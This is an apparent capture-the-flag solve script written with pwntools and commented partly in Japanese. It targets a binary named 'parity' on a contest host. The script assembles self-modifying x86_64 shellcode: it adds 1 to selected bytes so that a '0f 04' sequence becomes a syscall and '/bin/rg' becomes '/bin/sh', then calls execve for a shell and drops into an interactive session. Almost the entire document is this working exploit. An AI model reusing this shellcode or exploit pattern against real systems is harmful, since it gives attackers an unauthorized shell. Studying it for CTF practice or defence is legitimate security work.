from pwn import *


elf = ELF("./parity")

context(arch="x86_64", os="linux")

#sock = process(elf.path)
gs = """
break *main+255
continue
"""
#sock = gdb.debug(elf.path, gdbscript=gs)
sock = remote("challs.actf.co",31226)


payloads = asm("""
        push rdx # rdxはshellcodeが展開されるアドレス値なので保存しておく
        pop rcx
        push rdx
        pop rdi
        nop
        push rcx
        pop rax
        push rcx
        push 0x1
        nop
        pop rbx
        add BYTE PTR[rcx+0x32], bl
        push rcx
        inc cl
        add BYTE PTR[rcx+0x32], bl
        pop rcx
        add BYTE PTR[rcx+0x2c], bl

        // rdi = &"/bin/sh"
        push rcx
        add al, 0x2d
        push rax
        pop rdi
        
        // rdx = 0
        xor rdx, rdx
        push rcx
        
        // rax = 59
        xor rax, rax
        push rcx
        add al, 59
        
        // rsi = 0
        xor rsi, rsi
        
// syscall: 0f 05
.byte 0x0f
.byte 0x04

// /bin/sh
.byte 0x2f
.byte 0x62
.byte 0x69
.byte 0x6e
.byte 0x2f
.byte 0x72
.byte 0x67
.byte 0x00
.byte 0xff

""")
print(payloads.hex())
sock.sendlineafter(b"> ", payloads)
sock.interactive()

